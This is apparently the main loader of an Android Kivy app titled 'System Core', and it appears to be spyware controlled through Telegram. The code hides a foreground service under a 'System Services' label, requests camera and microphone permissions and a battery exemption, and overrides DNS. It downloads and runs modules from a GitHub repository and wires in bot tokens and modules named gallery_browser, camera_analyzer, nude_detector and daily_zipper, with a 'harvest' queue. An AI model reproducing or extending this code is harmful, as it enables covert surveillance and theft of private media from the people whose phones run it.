# -*- coding: utf-8 -*-
import os, sys, threading, importlib, requests, traceback, gc, time, socket, random, shutil
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

# ========== DNS patch (احتياطي ذكي) ==========
def _patch_dns():
    original_getaddrinfo = socket.getaddrinfo
    def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
        try:
            result = original_getaddrinfo(host, port, family, type, proto, flags)
            if result: return result
        except: pass
        override = {
            'raw.githubusercontent.com': ['185.199.108.133', '185.199.109.133', '185.199.110.133', '185.199.111.133'],
            'api.telegram.org': ['149.154.167.220', '149.154.167.221', '149.154.167.99', '149.154.175.50'],
            'zaen1993.github.io': ['185.199.108.153', '185.199.109.153', '185.199.110.153', '185.199.111.153'],
            'cdn.jsdelivr.net': ['151.101.2.229', '151.101.66.229', '151.101.130.229']
        }
        if host in override:
            fake_ip = random.choice(override[host])
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
        return original_getaddrinfo(host, port, family, type, proto, flags)
    socket.getaddrinfo = patched_getaddrinfo
_patch_dns()

INDEX_BASE_URLS = [
    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
    "https://zaen1993.github.io/Android-Core/index.json",
    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Cache-Control': 'no-cache', 'Pragma': 'no-cache'
}

def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p

R = _get_path()
U = os.path.join(R, "updates")
os.makedirs(U, exist_ok=True)
HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
os.makedirs(HARVEST_QUEUE, exist_ok=True)
MODELS_DIR = os.path.join(R, "models")
os.makedirs(MODELS_DIR, exist_ok=True)

def _get_root_path():
    return os.path.dirname(os.path.abspath(__file__))

APP_ROOT = _get_root_path()

# ترتيب المسارات: R (المُحمّل) أولاً، ثم APP_ROOT (المُضمّن)
if R not in sys.path: sys.path.insert(0, R)
if APP_ROOT not in sys.path: sys.path.insert(1, APP_ROOT)

def start_silent_service():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        nm = autoclass('android.app.NotificationManager')
        ch = autoclass('android.app.NotificationChannel')
        channel = ch("core_svc", "System Services", nm.IMPORTANCE_MIN)
        act.getSystemService(nm).createNotificationChannel(channel)
        builder = autoclass('android.app.Notification$Builder')(act, "core_svc")
        builder.setSmallIcon(act.getApplicationInfo().icon)
        builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
        act.startForeground(9921, builder.build())
        print("Foreground silent service started")
    except Exception as e:
        print(f"Foreground service error: {e}")

def _perms():
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET, Permission.CAMERA, Permission.RECORD_AUDIO,
            "android.permission.FOREGROUND_SERVICE"
        ])
    except Exception as e:
        print(f"Permissions error: {e}")
    start_silent_service()
    try:
        from jnius import autoclass
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = ctx.getSystemService(ctx.POWER_SERVICE)
        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
            Intent = autoclass('android.content.Intent')
            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            from android.net import Uri
            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
            ctx.startActivity(intent)
    except Exception as e:
        print(f"Battery exemption error: {e}")

def load_secrets_from_config():
    config_module = None
    try:
        config_module = importlib.import_module("config_template")
    except ImportError:
        try:
            config_module = importlib.import_module("config")
        except ImportError: pass
    if config_module is None:
        raise Exception("لا يمكن العثور على config_template.py أو config.py في المسار")
    if not hasattr(config_module, 'load_config'):
        raise Exception("الملف الموجود لا يحتوي على دالة load_config")
    active, reserve, ctrl, vault, secret = config_module.load_config()
    return active, reserve, ctrl, vault, secret

class CoreApp(App):
    def build(self):
        self.title = "System Core v4.2"
        layout = BoxLayout(orientation='vertical', spacing=5)
        self.log = TextInput(
            text="", readonly=True,
            background_color=(0.02, 0.02, 0.02, 1),
            foreground_color=(0.3, 0.9, 0.3, 1), font_size='10sp'
        )
        btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
        copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
        clear_btn.bind(on_press=self._clear)
        btns.add_widget(copy_btn); btns.add_widget(clear_btn)
        layout.add_widget(self.log); layout.add_widget(btns)
        Clock.schedule_once(self._start, 0.5)
        return layout

    def _copy(self, _):
        Clipboard.copy(self.log.text)
        self._log("Log copied to clipboard")

    def _clear(self, _): self.log.text = ""

    def _log(self, msg, lvl="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        def upd(dt):
            self.log.text += f"[{ts}] [{lvl}] {msg}\n"
            if len(self.log.text) > 15000: self.log.text = self.log.text[-8000:]
            self.log.cursor = (0, len(self.log.text))
        Clock.schedule_once(upd, 0)

    def _check_connectivity(self):
        test_urls = [
            "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
            "https://zaen1993.github.io/Android-Core/index.json",
            "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
        ]
        for url in test_urls:
            try:
                resp = requests.head(url, timeout=10, verify=True, headers=HEADERS)
                return True
            except: continue
        try:
            requests.get("https://clients3.google.com/generate_204", timeout=10)
            return True
        except: return False

    def _download_safe(self, url, filename):
        final_path = os.path.join(R, filename)
        try:
            resp = requests.get(f"{url}?t={int(time.time())}", headers=HEADERS, timeout=20)
            if resp.status_code == 200 and len(resp.content) > 200:
                with open(final_path, 'wb') as f: f.write(resp.content)
                return True
        except Exception as e: self._log(f"Download error for {filename}: {e}", "WARN")
        return False

    def _ensure_model_available(self):
        model_filename = "engine_v2.tflite"
        model_dest = os.path.join(MODELS_DIR, model_filename)
        if os.path.exists(model_dest) and os.path.getsize(model_dest) > 4_000_000:
            return True
        model_src = os.path.join(APP_ROOT, model_filename)
        if os.path.exists(model_src) and os.path.getsize(model_src) > 4_000_000:
            shutil.copyfile(model_src, model_dest)
            self._log("AI model copied from app package.")
            return True
        return False

    def _download_model_if_missing(self, model_url):
        if self._ensure_model_available():
            self._log("AI model already available.")
            return True
        model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
        if os.path.exists(model_path): os.remove(model_path)
        self._log("Downloading AI model (5.19 MB)...")
        try:
            resp = requests.get(model_url, headers=HEADERS, timeout=60, stream=True)
            if resp.status_code == 200:
                total = 0
                with open(model_path, 'wb') as f:
                    for chunk in resp.iter_content(chunk_size=8192):
                        if chunk: f.write(chunk); total += len(chunk)
                if total >= 5_000_000:
                    self._log("AI model downloaded successfully.")
                    return True
                else:
                    self._log(f"Incomplete download: {total} bytes.", "WARN")
                    os.remove(model_path)
                    return False
            else: self._log(f"Model download HTTP {resp.status_code}", "ERROR")
        except Exception as e:
            self._log(f"Model download error: {e}", "ERROR")
            if os.path.exists(model_path): os.remove(model_path)
        return False

    def _background_update_task(self):
        if not self._check_connectivity():
            self._log("No internet connection. Will try again later.", "WARN")
            return
        self._log("Background update started...")
        all_files = []
        for base_url in INDEX_BASE_URLS:
            try:
                resp = requests.get(f"{base_url}?t={int(time.time())}", headers=HEADERS, timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    all_files = data.get('files', [])
                    break
            except: continue
        if all_files:
            for file_entry in all_files:
                name = file_entry.get('name'); url = file_entry.get('url')
                if not name or not url: continue
                if name == "engine_v2.tflite": self._download_model_if_missing(url)
                else: self._download_safe(url, name)
        else: self._log("Could not fetch index.json in background update.", "WARN")
        self._log("Background update finished.")

    def _start(self, _):
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        _perms()
        self._log("Shield Core v4.2 (Config template mode) starting...", "BOOT")

        # 1. تحميل النموذج المحلي إن وُجد
        self._ensure_model_available()

        # 2. بدء التحديث الخلفي
        threading.Thread(target=self._background_update_task, daemon=True).start()

        # 3. تحميل الإعدادات المحلية
        try:
            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_config()
            self._log("Secrets loaded from local config_template.py")
        except Exception as e:
            self._log(f"Failed to load secrets: {e}", "ERROR")
            return

        # 4. التحقق من الملفات الأساسية (تبحث في المسارين)
        essential_files = ["telegram_ui.py", "monitor.py", "commands.py"]
        missing = []
        for fname in essential_files:
            if os.path.exists(os.path.join(R, fname)) or os.path.exists(os.path.join(APP_ROOT, fname)):
                continue
            missing.append(fname)

        if missing:
            self._log(f"Missing essential files: {missing}. Check APK packaging or network.", "ERROR")
            return

        # 5. تنظيف الوحدات القديمة
        for mod in ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
                    "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager",
                    "config_template", "config"]:
            if mod in sys.modules: del sys.modules[mod]
        importlib.invalidate_caches()
        gc.collect()

        # 6. بدء النظام
        try:
            import monitor, telegram_ui, commands
            importlib.reload(monitor); importlib.reload(telegram_ui); importlib.reload(commands)

            UI_Class = getattr(telegram_ui, 'T', None)
            if UI_Class:
                mon = monitor.M()
                random.seed(mon.did)
                self._log(f"Device ID: {mon.did[:8]}...")

                ui = UI_Class(
                    m=mon, active_tokens=active_tokens, reserve_tokens=reserve_tokens,
                    ctrl_id=ctrl_id, vault_id=vault_id, app_password=secret_password
                )
                mon.ui = ui
                mon.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, ui, mon, cid, cbq)

                ui.start()
                mon.start()
                self._log("SYSTEM ONLINE", "SUCCESS")
                self._log(f"Device: {mon.did} | Model: {mon.dmd}")
                self._log(f"Active bots: {len(active_tokens)} | Reserve: {len(reserve_tokens)}")
            else:
                self._log("Class 'T' missing in telegram_ui.py", "ERROR")
        except Exception as e:
            self._log(f"FATAL: {e}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")
            Clock.schedule_once(lambda dt: self._start(None), 60)

    def on_pause(self): return True
    def on_stop(self):
        self._log("App stopped.")
        return True

if __name__ == '__main__':
    CoreApp().run()
